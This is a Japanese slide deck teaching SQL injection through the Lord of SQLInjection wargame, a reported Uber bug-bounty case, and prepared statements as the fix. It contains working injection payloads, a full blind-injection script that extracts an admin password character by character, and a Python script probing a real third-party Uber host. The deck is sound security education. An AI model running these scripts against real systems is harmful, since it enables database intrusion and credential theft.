---
# try also 'default' to start simple
theme: apple-basic
# random image from a curated Unsplash collection by Anthony
# like them? see https://unsplash.com/collections/94734566/slidev
background: https://source.unsplash.com/collection/94734566/1920x1080
# apply any windi css classes to the current slide
class: "text-center"
# https://sli.dev/custom/highlighters.html
highlighter: shiki
# some information about the slides, markdown enabled
layout: intro
info: |
    ## Slidev Starter Template
    Presentation slides for developers.

    Learn more at [Sli.dev](https://sli.dev)
---

# 楽しい SQL インジェクション

<div class="absolute bottom-10">
  <span class="font-700">
    2021/9/28 成ヶ澤 秀
  </span>
</div>

<a href="https://github.com/shu1007/slide-sql-injection" target="_blank" alt="GitHub"
  class="abs-br m-6 text-xl icon-btn opacity-50 !border-none !hover:text-white">
<carbon-logo-github />
</a>

<!--
The last comment block of each slide will be treated as slide notes. It will be visible and editable in Presenter Mode along with the slide. [Read more in the docs](https://sli.dev/guide/syntax.html#notes)
-->

---

# SQL インジェクション とは?

SQL インジェクション とは

> SQL インジェクション（英: SQL Injection）とは、アプリケーションのセキュリティ上の不備を意図的に利用し、アプリケーションが想定しない SQL 文を実行させることにより、データベースシステムを不正に操作する攻撃方法のこと。また、その攻撃を可能とする脆弱性のことである。\[[Wikipedia](https://ja.wikipedia.org/wiki/SQLインジェクション)\]

---

# Load of SQLInjection

SQL インジェクション をアドベンチャーゲームに見立てて遊べる Web サイト。

https://los.rubiya.kr/

<img src="/image/screenshot_losi1.png">

---

# Load of SQLInjection

遊び方

-   実行されるソースコードが表示されている
-   このソースコードで solve 関数が実行されるようにパラメータを渡す(下のコードだと id と pw)

```php {all|5-6|7|9-10|all}
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

---

# 1 問目を解いてみる

## Goal

以下のクエリで 1 行以上を SELECT

```sql
select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'
```

<v-click>

## Answer

以下のように入力

```
https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=' or true--%20
```

これで以下の SQL が実行されることになる

```sql
select id from prob_gremlin where id='' or true-- and pw=''
```

</v-click>

<div v-click>
すべての行が SELECT 出来た！
</div>

---

# 他の問題

```php {all|6|8-9|11-14|all}
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello admin</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc");
  highlight_file(__FILE__);
?>
```

<div v-click>
正しいPWを調べなければいけない！！
</div>

---

# どう解く？

## ポイント

以下が結果を返せれば、それを知ることが出来る

```sql
select id from prob_orc where id='admin' and pw='{$_get[pw]}'
```

---

# PW の長さ

## length()を使う

```sql
select id from prob_orc where id='admin' and pw='' or 1 < length(pw) and id='admin'
```

上記のクエリは id が admin で pw の長さが 1 より大きいならば行を返す

<div v-click>

```sql
select id from prob_orc where id='admin' and pw='' or 100 < length(pw) and id='admin'
```

上記のクエリは id が admin で pw の長さが 100 より大きくなければ行を返さない

</div>

<div v-click>
数値を変えていくことでPWの長さが得られる！！
</div>

---

# PW の長さ

<div>

```ts
let left = 0;
let right = 100;
while (left + 1 != right) {
    const val = Math.round((right - left) / 2) + left;
    if (
        judge(await sendRequest(`pw=' or length(pw) <= ${val} and id='admin`))
    ) {
        right = val;
    } else {
        left = val;
    }
}

const length = right;
console.log(`length=${length}`);
```

</div>

---

# PW の特定

## substring(), ascii()

```sql
select id from prob_orc where id='admin' and pw='' or 122 > ascii(substring(pw, 1, 1)) and id='admin'
```

上記のクエリは id が admin で pw の 1 文字目のアスキーコードが 122(z)未満なら行を返す

<div v-click>

```sql
select id from prob_orc where id='admin' and pw='' or 48 > ascii(substring(pw, 1, 1)) and id='admin'
```

上記のクエリは id が admin で pw の 1 文字目のアスキーコードが 48(0)未満じゃなければ行を返さない

</div>

<div v-click>
数値を変えていくことでPWが得られる！！
</div>

---

# PW の特定

```ts
let i = 0;
let result = "";
while (i != length) {
    left = 0;
    right = 256;
    while (left + 1 != right) {
        const val = Math.round((right - left) / 2) + left;
        if (
            judge(
                await sendRequest(
                    `pw=' or ${val} > ascii(substr(pw,${
                        i + 1
                    },1)) and id='admin`
                )
            )
        ) {
            right = val;
        } else {
            left = val;
        }
    }
    result += String.fromCharCode(left);
    ++i;
}
```

---

# コード

deno で実行

```ts
const SESSION_COOKIE = "flqhag5p3ht49enaoiceppm9o0";
const TARGET_URL =
    "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php";

const sendRequest = async (query: string) => {
    const response = await fetch(`${TARGET_URL}?${query}`, {
        headers: { Cookie: `PHPSESSID=${SESSION_COOKIE}` }
    });
    return await response.text();
};

const judge = (text: string) => {
    return text.match(/Hello admin/g)?.length == 1;
};

let left = 0;
let right = 100;
while (left + 1 != right) {
    const val = Math.round((right - left) / 2) + left;
    if (
        judge(await sendRequest(`pw=' or length(pw) <= ${val} and id='admin`))
    ) {
        right = val;
    } else {
        left = val;
    }
}

const length = right;
console.log(`length=${length}`);

let i = 0;
let result = "";
while (i != length) {
    left = 0;
    right = 256;
    while (left + 1 != right) {
        const val = Math.round((right - left) / 2) + left;
        if (
            judge(
                await sendRequest(
                    `pw=' or ${val} > ascii(substr(pw,${
                        i + 1
                    },1)) and id='admin`
                )
            )
        ) {
            right = val;
        } else {
            left = val;
        }
    }
    result += String.fromCharCode(left);
    ++i;
}

console.log(`pw=${result}`);
```

<style>
  .shiki-container {
    max-height: 400px;
    code {
      overflow: scroll;
    }
  }
</style>

---

# 実際に起きた事例

[リアルワールドバグハンティング (オライリージャパン)](https://www.oreilly.co.jp/books/9784873119212/)より

## Uber での事例

-   Uber からメール広告を受信
-   購読解除のリンクに base64 エンコードされたパラメータが付与されていた
-   そのパラメータは JSON 文字列で以下のようなものだった

    -   ```json
        { "user_id": "5755", "receiver": "orange@mymail" }
        ```

-   以下のように変更した JSON 文字列の base64 エンコードしたものを送信
    -   ```json
        { "user_id": "5755 and sleep(12)=1", "receiver": "orange@mymail" }
        ```

<div v-click>
12秒以上処理がかかるようになった！
</div>

---

# DB の User の特定

user()は SQL のユーザーとホストを\<user\>@\<host\>の形式で返す。
以下のような python のコードを実行してユーザーを特定したらしい

```py {all|10|14-16|all}
import json
import string
import requests
from urllib import quote
from base64 import b64encode
base = string.digits + string.letters + '_-@.'
payload ={ "user_id": "5755", "receiver": "blog.orange.tw" }
for l in range(0, 30):
  for i in base:
    payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1. i)
    new_payload = json.dumps(payload)
    new_payload = b64encode(new_payload)
    r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))
    if len(r.content)>0:
        print i,
        break
```

---

# 結果

-   ユーザー名とホストが sendcloud_w@10.9.79.210, DB 名が sendcloud と判明
-   Uber に報告すると、自社サーバーではこの事象は発生しないが、サードパーティのサーバーで発生
-   Uber はこのバグ報告に対して$4,000 の支払い
-   バグの報告日は 2016/7/8(そんなに昔じゃない)

<br/>
<div v-click >

<p style="font-size:1.5em"> 有名な会社でも起こりうるし、昔はそんなハッキングも出来たよねという話ではない。</p>

</div>

---

# どうしたらよいのか？

## Prepared Statement

実行したい SQL をコンパイルした 一種のテンプレートのようなものです。パラメータ変数を使用することで SQL をカスタマイズすることが可能

-   クエリのパース (あるいは準備) が必要なのは最初の一回だけで、 同じパラメータ (あるいは別のパラメータ) を指定して何度でも クエリを実行することができる。解析/コンパイル/最適化 の繰り返しを避けることができ、高速に動作する
-   プリペアドステートメントに渡すパラメータは、引用符で括る必要がない。 アプリケーションで明示的にプリペアドステートメントを使用するように すれば、SQL インジェクションは発生しない。

---

# Prepared Statement

## PHP での例

```php{all|2-4|7-9|12-14}
<?php
$stmt = $dbh->prepare("INSERT INTO REGISTRY (name, value) VALUES (?, ?)");
$stmt->bindParam(1, $name);
$stmt->bindParam(2, $value);

// 行を挿入します
$name = 'one';
$value = 1;
$stmt->execute();

// パラメータを変更し、別の行を挿入します
$name = 'two';
$value = 2;
$stmt->execute();
?>
```

参考: https://www.php.net/manual/ja/pdo.prepared-statements.php

---

# まとめ

-   SQL インジェクション は不正に SQL を実行する攻撃手法
-   身近な問題で普段書いているコードでも起こりうる
-   Prepared Statement は対策として効果的

DB 周りのコードを書くときには意識してみよう!!
